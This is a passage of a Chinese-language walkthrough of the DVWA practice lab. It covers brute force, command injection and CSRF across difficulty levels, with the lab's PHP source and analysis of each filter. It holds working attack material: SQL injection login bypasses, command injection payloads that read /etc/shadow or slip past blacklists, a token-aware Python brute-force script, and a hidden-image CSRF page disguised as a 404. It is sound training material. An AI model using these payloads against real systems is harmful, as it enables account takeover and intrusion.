# DVWA-WalkThrough

<p align="center">
    <img src="../../../../../assets/img/logo/dvwa.png" width="15%">
</p>

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**靶场项目地址**
- https://github.com/ethicalhack3r/DVWA

**知识点**
- [暴力破解](#brute_force)
- [命令执行](#command_injection)
- [CSRF](#csrf)
- [文件包含](#file_inclusion)
- [文件上传](#file_upload)
- [验证码绕过](#insecure_captcha)
- [SQL 注入](#sql_injection)
- [SQL 注入(盲注)](#sql_injection(blind))
- [Session 绕过](#weak_session_ids)
- [XSS](#xss)
- [CSP Bypass](#csp_bypass)
- [JS 攻击](#javascript_attacks)

**实验环境**

`环境仅供参考`

- phpstudy(可以测试 `%00` 截断,你还可以顺便测试 Phpstudy 后门)
- Microsoft Windows 10 企业版 LTSC - 10.0.17763
- dvwa Version 1.10 *Development* (Release date: 2015-10-08)
- VMware® Workstation 15 Pro - 15.0.0 build-10134415
- kali 4.19.0-kali3-amd64

---

## 搭建/使用

**windows**

推荐用 [phpstudy](http://phpstudy.php.cn/) 进行快速搭建

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa1.png)
![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa2.png)
![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa3.png)

修改 config.inc.php,配置数据库密码 `$_DVWA[ 'db_password' ] = 'root';`

> 登录 Login URL: http://127.0.0.1/dvwa/login.php

> 账号密码: admin/password

**难度**

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa4.png)

---

## Brute_Force

Brute Force,即暴力(破解),是指黑客利用密码字典,使用穷举法猜解出用户口令

### Low

**服务器端核心代码**
```php
<?php

if( isset( $_GET[ 'Login' ] ) ) {
	// Get username
	$user = $_GET[ 'username' ];

	// Get password
	$pass = $_GET[ 'password' ];
	$pass = md5( $pass );

	// Check the database
	$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	if( $result && mysqli_num_rows( $result ) == 1 ) {
		// Get users details
		$row    = mysqli_fetch_assoc( $result );
		$avatar = $row["avatar"];

		// Login successful
		$html .= "<p>Welcome to the password protected area {$user}</p>";
		$html .= "<img src=\"{$avatar}\" />";
	}
	else {
		// Login failed
		$html .= "<pre><br />Username and/or password incorrect.</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```
可以看到,服务器只是验证了参数 Login 是否被设置(isset 函数在 php 中用来检测变量是否设置,该函数返回的是布尔类型的值,即 true/false),没有任何的防爆破机制,且对参数 username、password 没有做任何过滤,存在明显的 sql 注入漏洞.

**利用爆破 burpsuite**

0. burp 的安装过程略
1. 抓包
2. ctrl+I 将包复制到 intruder 模块,因为要对 password 参数进行爆破,所以在 password 参数的内容两边加 $
![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa5.png)

3. 选中 Payloads,载入字典,点击 Start attack 进行爆破
![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa6.png)
![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa7.png)

4. 最后,尝试在爆破结果中找到正确的密码,可以看到 password 的响应包长度(length)"与众不同",可推测 password 为正确密码,手工验证登陆成功.

**手工 sql 注入**

1. Username : admin' or '1'='1 Password :(空),此时 sql 语句如下图:
![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa8.png)

2. Username :admin' # Password :(空),此时 sql 语句如下图:
![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa9.png)

### Medium

**服务器端核心代码**
```php
<?php

if( isset( $_GET[ 'Login' ] ) ) {
	// Sanitise username input
	$user = $_GET[ 'username' ];
	$user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Sanitise password input
	$pass = $_GET[ 'password' ];
	$pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$pass = md5( $pass );

	// Check the database
	$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	if( $result && mysqli_num_rows( $result ) == 1 ) {
		// Get users details
		$row    = mysqli_fetch_assoc( $result );
		$avatar = $row["avatar"];

		// Login successful
		$html .= "<p>Welcome to the password protected area {$user}</p>";
		$html .= "<img src=\"{$avatar}\" />";
	}
	else {
		// Login failed
		sleep( 2 );
		$html .= "<pre><br />Username and/or password incorrect.</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```
相比 Low 级别的代码,Medium 级别的代码主要增加了 mysql_real_escape_string 函数,这个函数会对字符串中的特殊符号(x00,n,r,,’,",x1a)进行转义,基本上能够抵御 sql 注入攻击,但 MySQL5.5.37 以下版本如果设置编码为 GBK,能够构造编码绕过 mysql_real_escape_string 对单引号的转义(因实验环境的 MySQL 版本较新,所以并未做相应验证);同时,$pass 做了 MD5 校验,杜绝了通过参数 password 进行 sql 注入的可能性.但是,依然没有加入有效的防爆破机制(sleep(2)实在算不上).

具体的 mysql_real_escape_string 函数绕过问题详见
- [PHP防SQL注入不要再用addslashes和mysql_real_escape_string了](https://web.archive.org/web/20171107192133/https://blog.csdn.net/hornedreaper1988/article/details/43520257)
- [PHP字符编码绕过漏洞总结](http://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html)
- [mysql_real_escape_string() versus Prepared Statements](https://ilia.ws/archives/103-mysql_real_escape_string-versus-Prepared-Statements.html)

虽然sql注入不再有效,但依然可以使用 Burpsuite 进行爆破,与 Low 级别的爆破方法基本一样,这里就不赘述了.

### High

**服务器端核心代码**
```php
<?php

if( isset( $_GET[ 'Login' ] ) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

	// Sanitise username input
	$user = $_GET[ 'username' ];
	$user = stripslashes( $user );
	$user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Sanitise password input
	$pass = $_GET[ 'password' ];
	$pass = stripslashes( $pass );
	$pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$pass = md5( $pass );

	// Check database
	$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	if( $result && mysqli_num_rows( $result ) == 1 ) {
		// Get users details
		$row    = mysqli_fetch_assoc( $result );
		$avatar = $row["avatar"];

		// Login successful
		$html .= "<p>Welcome to the password protected area {$user}</p>";
		$html .= "<img src=\"{$avatar}\" />";
	}
	else {
		// Login failed
		sleep( rand( 0, 3 ) );
		$html .= "<pre><br />Username and/or password incorrect.</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```
High级别的代码加入了 Token,可以抵御 CSRF 攻击,同时也增加了爆破的难度,通过抓包,可以看到,登录验证时提交了四个参数:username、password、Login 以及 user_token.

每次服务器返回的登陆页面中都会包含一个随机的 user_token 的值,用户每次登录时都要将 user_token 一起提交.服务器收到请求后,会优先做 token 的检查,再进行 sql 查询.
![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa10.png)

同时,High 级别的代码中,使用了 stripslashes(去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个)、 mysql_real_escape_string 对参数 username、password 进行过滤、转义,进一步抵御 sql 注入.

**使用 python 脚本爆破**

`适用于老版本 dvwa 环境`
```python
from bs4 import BeautifulSoup
import urllib2
header={
        'Host': '<改成你自己机器IP!!!>',
		'Cache-Control': 'max-age=0',
		'If-None-Match': "307-52156c6a290c0",
		'If-Modified-Since': 'Mon, 05 Oct 2015 07:51:07 GMT',
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36',
		'Accept': '*/*',
		'Referer': 'http://<改成你自己机器IP!!!>/dvwa/vulnerabilities/brute/index.php',
		'Accept-Encoding': 'gzip, deflate, sdch',
		'Accept-Language': 'zh-CN,zh;q=0.8',
		'Cookie': 'security=high; PHPSESSID=5re92j36t4f2k1gvnqdf958bi2'
        }
requrl = "http://<改成你自己机器IP!!!>/dvwa/vulnerabilities/brute/"

def get_token(requrl,header):
	req = urllib2.Request(url=requrl,headers=header)
	response = urllib2.urlopen(req)
	print response.getcode(),
	the_page = response.read()
	print len(the_page)
	soup = BeautifulSoup(the_page,"html.parser")
	user_token = soup.form.input.input.input.input["value"] # get the user_token
	return user_token

user_token = get_token(requrl,header)
i=0
for line in open("password.txt"):
	requrl = "http://<改成你自己机器IP!!!>/dvwa/vulnerabilities/brute/"+"?username=admin&password="+line.strip()+"&Login=Login&user_token="+user_token
	i = i+1
	print i,'admin',line.strip(),
	user_token = get_token(requrl,header)
	if (i == 10):
		break
```
get_token 的功能是通过 python 的 BeautifulSoup 库从 html 页面中抓取 user_token 的值,为了方便展示,这里设置只尝试 10 次.

注:在最新版本中,由于 hard 难度的源代码修改,无法直接使用 BeautifulSoup 匹配 user_token 值,在此给出我略微修改的版本
```python
import requests, re
from bs4 import BeautifulSoup

requrl='http://<改成你自己机器IP!!!>/dvwa/vulnerabilities/brute/'
header={
        'Host': '<改成你自己机器IP!!!>',
		'Cache-Control': 'max-age=0',
		'If-None-Match': "307-52156c6a290c0",
		'If-Modified-Since': 'Mon, 05 Oct 2015 07:51:07 GMT',
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36',
		'Accept': '*/*',
		'Referer': 'http://192.168.153.130/dvwa/vulnerabilities/brute/index.php',
		'Accept-Encoding': 'gzip, deflate, sdch',
		'Accept-Language': 'zh-CN,zh;q=0.8',
		'Cookie': 'security=high; PHPSESSID=vlalfd2e2rbtptnd8pqqn646g4'
        }

def get_token(requrl,header):
    req = requests.get(url=requrl,headers=header)
    page = req.text
    soup = BeautifulSoup(page,"html.parser")
    value = soup.select("input[name=user_token]")

    key=str(value)
    p1 = r"(?<=value=\").+?(?=\")"
    pattern1 = re.compile(p1)
    matcher1 = re.search(pattern1,key)

    user_token= matcher1.group(0)
    a=str(user_token)
    print (req.status_code,len(page))
    return a

user_token = get_token(requrl,header)
i=0

for key in open("password.txt"):

    requrl = "http://<改成你自己机器IP!!!>/dvwa/vulnerabilities/brute/"+"?username=admin&password="+key.strip()+"&Login=Login&user_token="+user_token

    i = i+1
    print (i,'admin',key.strip(), end=" " )
    user_token = get_token(requrl,header)
    if (i == 100):
        break
```
![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa11.png)

代码写的烂,不要笑话其实用这个匹配是最关键的 `user_token = re.findall(r"name='user_token' value='(.+?)'",content)[0]`

注: 使用 urllib3 的 ProxyManager 可以让 python 产生的 http 请求流量通过 burpsutie 的 proxy

```python
import urllib3.request

    proxy = urllib3.ProxyManager('http://127.0.0.1:8080', headers=header)
    req = proxy.request('POST', url=requrl)
```
![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa12.png)

另外,可以使用 burp 的插件 CSRF Token Tracker 捕捉 token,请自行研究

### Impossible

**服务器端核心代码**
```php
<?php

if( isset( $_POST[ 'Login' ] ) && isset ($_POST['username']) && isset ($_POST['password']) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

	// Sanitise username input
	$user = $_POST[ 'username' ];
	$user = stripslashes( $user );
	$user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Sanitise password input
	$pass = $_POST[ 'password' ];
	$pass = stripslashes( $pass );
	$pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$pass = md5( $pass );

	// Default values
	$total_failed_login = 3;
	$lockout_time       = 15;
	$account_locked     = false;

	// Check the database (Check user information)
	$data = $db->prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );
	$data->bindParam( ':user', $user, PDO::PARAM_STR );
	$data->execute();
	$row = $data->fetch();

	// Check to see if the user has been locked out.
	if( ( $data->rowCount() == 1 ) && ( $row[ 'failed_login' ] >= $total_failed_login ) )  {
		// User locked out.  Note, using this method would allow for user enumeration!
		//$html .= "<pre><br />This account has been locked due to too many incorrect logins.</pre>";

		// Calculate when the user would be allowed to login again
		$last_login = strtotime( $row[ 'last_login' ] );
		$timeout    = $last_login + ($lockout_time * 60);
		$timenow    = time();

		/*
		print "The last login was: " . date ("h:i:s", $last_login) . "<br />";
		print "The timenow is: " . date ("h:i:s", $timenow) . "<br />";
		print "The timeout is: " . date ("h:i:s", $timeout) . "<br />";
		*/

		// Check to see if enough time has passed, if it hasn't locked the account
		if( $timenow < $timeout ) {
			$account_locked = true;
			// print "The account is locked<br />";
		}
	}

	// Check the database (if username matches the password)
	$data = $db->prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
	$data->bindParam( ':user', $user, PDO::PARAM_STR);
	$data->bindParam( ':password', $pass, PDO::PARAM_STR );
	$data->execute();
	$row = $data->fetch();

	// If its a valid login...
	if( ( $data->rowCount() == 1 ) && ( $account_locked == false ) ) {
		// Get users details
		$avatar       = $row[ 'avatar' ];
		$failed_login = $row[ 'failed_login' ];
		$last_login   = $row[ 'last_login' ];

		// Login successful
		$html .= "<p>Welcome to the password protected area <em>{$user}</em></p>";
		$html .= "<img src=\"{$avatar}\" />";

		// Had the account been locked out since last login?
		if( $failed_login >= $total_failed_login ) {
			$html .= "<p><em>Warning</em>: Someone might of been brute forcing your account.</p>";
			$html .= "<p>Number of login attempts: <em>{$failed_login}</em>.<br />Last login attempt was at: <em>${last_login}</em>.</p>";
		}

		// Reset bad login count
		$data = $db->prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' );
		$data->bindParam( ':user', $user, PDO::PARAM_STR );
		$data->execute();
	} else {
		// Login failed
		sleep( rand( 2, 4 ) );

		// Give the user some feedback
		$html .= "<pre><br />Username and/or password incorrect.<br /><br/>Alternative, the account has been locked because of too many failed logins.<br />If this is the case, <em>please try again in {$lockout_time} minutes</em>.</pre>";

		// Update bad login count
		$data = $db->prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );
		$data->bindParam( ':user', $user, PDO::PARAM_STR );
		$data->execute();
	}

	// Set the last login time
	$data = $db->prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );
	$data->bindParam( ':user', $user, PDO::PARAM_STR );
	$data->execute();
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```
可以看到 Impossible 级别的代码加入了可靠的防爆破机制,当检测到频繁的错误登录后,系统会将账户锁定,爆破也就无法继续.

同时采用了更为安全的 PDO(PHP Data Object)机制防御 sql 注入,这是因为不能使用 PDO 扩展本身执行任何数据库操作,而 sql 注入的关键就是通过破坏 sql 语句结构执行恶意的 sql 命令.

关于 PDO
- [PHP学习笔记之PDO](https://www.cnblogs.com/pinocchioatbeijing/archive/2012/03/20/2407869.html)

---

## Command_Injection

Command Injection,即命令注入,是指通过提交恶意构造的参数破坏命令语句结构,从而达到执行恶意命令的目的.PHP 命令注入攻击漏洞是 PHP 应用程序中常见的脚本漏洞之一,国内著名的 Web 应用程序 Discuz!、DedeCMS 等都曾经存在过该类型漏洞.

### Low

**服务器端核心代码**
```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
	// Get input
	$target = $_REQUEST[ 'ip' ];

	// Determine OS and execute the ping command.
	if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
		// Windows
		$cmd = shell_exec( 'ping  ' . $target );
	}
	else {
		// *nix
		$cmd = shell_exec( 'ping  -c 4 ' . $target );
	}

	// Feedback for the end user
	$html .= "<pre>{$cmd}</pre>";
}

?>
```

**相关函数介绍**
- **stristr(string,search,before_search)**

	stristr 函数搜索字符串在另一字符串中的第一次出现,返回字符串的剩余部分(从匹配点),如果未找到所搜索的字符串,则返回 FALSE.详细如下:
	```
	string	必需.规定被搜索的字符串.
	search	必需.规定要搜索的字符串.如果该参数是数字,则搜索匹配该数字对应的 ASCII 值的字符.
	before_search	可选.默认值为 "false" 的布尔值.如果设置为 "true",它将返回 search 参数第一次出现之前的字符串部分.
	返回值:返回字符串的剩余部分(从匹配点).如果未找到所搜索的字符串,则返回 FALSE.
	在 PHP 5.3 中,新增了 before_search 参数.
	在 PHP 4.3 中,该函数变成是二进制安全的.
	```

- **php_uname(mode)**

	这个函数会返回运行php的操作系统的相关描述,参数 mode 可取值"a" (此为默认,包含序列"s n r v m"里的所有模式),"s "(返回操作系统名称),"n"(返回主机名)," r"(返回版本名称),"v"(返回版本信息), "m"(返回机器类型).

	可以看到,服务器通过判断操作系统执行不同ping命令,但是对ip参数并未做任何的过滤,导致了严重的命令注入漏洞.

**漏洞利用**

windows 和 linux 系统都可以用 && 来执行多条命令

`127.0.0.1 && net user`

Linux 下输入 `127.0.0.1 && cat /etc/shadow` 甚至可以读取 shadow 文件,可见危害之大.

### Medium

**服务器端核心代码**
```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
	// Get input
	$target = $_REQUEST[ 'ip' ];

	// Set blacklist
	$substitutions = array(
		'&&' => '',
		';'  => '',
	);

	// Remove any of the charactars in the array (blacklist).
	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );

	// Determine OS and execute the ping command.
	if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
		// Windows
		$cmd = shell_exec( 'ping  ' . $target );
	}
	else {
		// *nix
		$cmd = shell_exec( 'ping  -c 4 ' . $target );
	}

	// Feedback for the end user
	$html .= "<pre>{$cmd}</pre>";
}

?>
```
可以看到,相比 Low 级别的代码,服务器端对 ip 参数做了一定过滤,即把"&&" 、";"删除,本质上采用的是黑名单机制,因此依旧存在安全问题.

**漏洞利用**

`127.0.0.1 & net user`

因为被过滤的只有"&&"与" ;",所以"&"不会受影响.

这里需要注意的是"&&"与" &"的区别:

`Command 1 && Command 2`
先执行 Command 1,执行成功后执行 Command 2,否则不执行 Command 2
`Command 1 & Command 2`
先执行 Command 1,不管是否成功,都会执行 Command 2

**漏洞利用2**

由于使用的是 str_replace 把"&&" 、";"替换为空字符,因此可以采用以下方式绕过:

`127.0.0.1 &;& ipconfig`

这是因为 `127.0.0.1&;&ipconfig` 中的 `;` 会被替换为空字符,这样一来就变成了 `127.0.0.1&& ipconfig` ,会成功执行.

### High

**服务器端核心代码**
```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
	// Get input
	$target = trim($_REQUEST[ 'ip' ]);

	// Set blacklist
	$substitutions = array(
		'&'  => '',
		';'  => '',
		'| ' => '',
		'-'  => '',
		'$'  => '',
		'('  => '',
		')'  => '',
		'`'  => '',
		'||' => '',
	);

	// Remove any of the charactars in the array (blacklist).
	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );

	// Determine OS and execute the ping command.
	if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
		// Windows
		$cmd = shell_exec( 'ping  ' . $target );
	}
	else {
		// *nix
		$cmd = shell_exec( 'ping  -c 4 ' . $target );
	}

	// Feedback for the end user
	$html .= "<pre>{$cmd}</pre>";
}

?>
```
相比 Medium 级别的代码,High 级别的代码进一步完善了黑名单,但由于黑名单机制的局限性,我们依然可以绕过.

**漏洞利用**

黑名单看似过滤了所有的非法字符,但仔细观察到是把`| `(注意这里|后有一个空格)替换为空字符,于是 "|"成了"漏网之鱼".

`127.0.0.1|net user`
Command 1 | Command 2

`|`是管道符,表示将 Command 1 的输出作为 Command 2 的输入,并且只打印 Command 2 执行的结果.

### Impossible

**服务器端核心代码**
```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

	// Get input
	$target = $_REQUEST[ 'ip' ];
	$target = stripslashes( $target );

	// Split the IP into 4 octects
	$octet = explode( ".", $target );

	// Check IF each octet is an integer
	if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
		// If all 4 octets are int's put the IP back together.
		$target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];

		// Determine OS and execute the ping command.
		if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
			// Windows
			$cmd = shell_exec( 'ping  ' . $target );
		}
		else {
			// *nix
			$cmd = shell_exec( 'ping  -c 4 ' . $target );
		}

		// Feedback for the end user
		$html .= "<pre>{$cmd}</pre>";
	}
	else {
		// Ops. Let the user name theres a mistake
		$html .= '<pre>ERROR: You have entered an invalid IP.</pre>';
	}
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

**相关函数介绍**
- **stripslashes(string)**

	stripslashes 函数会删除字符串 string 中的反斜杠,返回已剥离反斜杠的字符串.

- **explode(separator,string,limit)**

	把字符串打散为数组,返回字符串的数组.参数 separator 规定在哪里分割字符串,参数 string 是要分割的字符串,可选参数 limit 规定所返回的数组元素的数目.

- **is_numeric(string)**

	检测 string 是否为数字或数字字符串,如果是返回 TRUE,否则返回 FALSE.

	可以看到,Impossible 级别的代码加入了 Anti-CSRF token,同时对参数 ip 进行了严格的限制,只有诸如"数字.数字.数字.数字"的输入才会被接收执行,因此不存在命令注入漏洞.

## CSRF

CSRF,全称 Cross-site request forgery,翻译过来就是跨站请求伪造,是指利用受害者尚未失效的身份认证信息(cookie、会话等),诱骗其点击恶意链接或者访问包含攻击代码的页面,在受害人不知情的情况下以受害者的身份向(身份认证信息所对应的)服务器发送请求,从而完成非法操作(如转账、改密等).CSRF 与 XSS 最大的区别就在于,CSRF 并没有盗取 cookie 而是直接利用.在 2013 年发布的新版 OWASP Top 10 中,CSRF 排名第 8.

### Low

**服务器端核心代码**
```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
	// Get input
	$pass_new  = $_GET[ 'password_new' ];
	$pass_conf = $_GET[ 'password_conf' ];

	// Do the passwords match?
	if( $pass_new == $pass_conf ) {
		// They do!
		$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
		$pass_new = md5( $pass_new );

		// Update the database
		$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
		$result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

		// Feedback for the user
		$html .= "<pre>Password Changed.</pre>";
	}
	else {
		// Issue with passwords matching
		$html .= "<pre>Passwords did not match.</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```
可以看到,服务器收到修改密码的请求后,会检查参数 `password_new` 与 `password_conf` 是否相同,如果相同,就会修改密码,并没有任何的防 CSRF 机制(当然服务器对请求的发送者是做了身份验证的,是检查的 cookie,只是这里的代码没有体现= =).

**漏洞利用**

`http://<IP地址!!!>/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#`

当受害者点击了这个链接,他的密码就会被改成 password(这种攻击显得有些拙劣,链接一眼就能看出来是改密码的,而且受害者点了链接之后看到这个页面就会知道自己的密码被篡改了)

需要注意的是,CSRF 最关键的是利用受害者的 cookie 向服务器发送伪造请求,所以如果受害者之前用 A 浏览器登录的这个系统,而用 B 浏览器点击这个链接,攻击是不会触发的,因为 B 浏览器并不能利用 Chrome 浏览器的 cookie,所以会自动跳转到登录界面.

有人会说,这个链接也太明显了吧,不会有人点的,没错,所以真正攻击场景下,我们需要对链接做一些处理.

**漏洞利用2**

我们可以使用短链接来隐藏 URL(点击短链接,会自动跳转到真实网站),自寻搜索"短网址工具 "

**漏洞利用3**

可以构造攻击页面,现实攻击场景下,这种方法需要事先在公网上传一个攻击页面,诱骗受害者去访问,真正能够在受害者不知情的情况下完成 CSRF 攻击.这里为了方便演示,就在本地写一个 test.html,下面是具体代码.

```html
<img src="http://<IP地址!!!>/dvwa/vulnerabilities/csrf/?password_new=hack&password_conf=hack&Change=Change#" border="0" style="display:none;"/>

<h1>404<h1>

<h2>file not found.<h2>
```
![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa13.png)

### Medium

**服务器端核心代码**
```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
	// Checks to see where the request came from
	if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
		// Get input
		$pass_new  = $_GET[ 'password_new' ];
		$pass_conf = $_GET[ 'password_conf' ];

		// Do the passwords match?
		if( $pass_new == $pass_conf ) {
			// They do!
			$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
			$pass_new = md5( $pass_new );

			// Update the database
			$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
			$result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

			// Feedback for the user
			$html .= "<pre>Password Changed.</pre>";
		}
		else {
			// Issue with passwords matching
			$html .= "<pre>Passwords did not match.</pre>";
		}
	}
	else {
		// Didn't come from a trusted source
		$html .= "<pre>That request didn't look correct.</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

**相关函数说明**
- **int eregi(string pattern, string string)**

	检查 string 中是否含有 pattern(不区分大小写),如果有返回 True,反之 False.

- **stripos(string,find,start)**

	stripos() 函数查找字符串在另一字符串中第一次出现的位置,不区分大小写.

可以看到,Medium 级别的代码检查了保留变量 HTTP_REFERER(http 包头的 Referer 参数的值,表示来源地址)中是否包含 SERVER_NAME(http 包头的 Host 参数,及要访问的主机名,这里是 dvwa靶机的IP地址),希望通过这种机制抵御 CSRF 攻击.

PHP 超全局变量 `$_SERVER` 中的两个值:

$_SERVER['HTTP_REFERER']:PHP 中获取链接到当前页面的前一页面的 url 链接地址,即 HTTP 数据包中的 Referer 参数的值.

$_SERVER['SERVER_NAME']:PHP 中获取服务器主机的名称,即 HTTP 数据包中的 Host 参数的值.

**漏洞利用**

过滤规则是 http 包头的 Referer 参数的值中必须包含主机名(这里是 dvwa 靶机的 IP 地址)

我们可以将攻击页面命名为 <dvwa靶机的IP地址>.html 就可以绕过了

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa14.png)

### High

**服务器端核心代码**
```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

	// Get input
	$pass_new  = $_GET[ 'password_new' ];
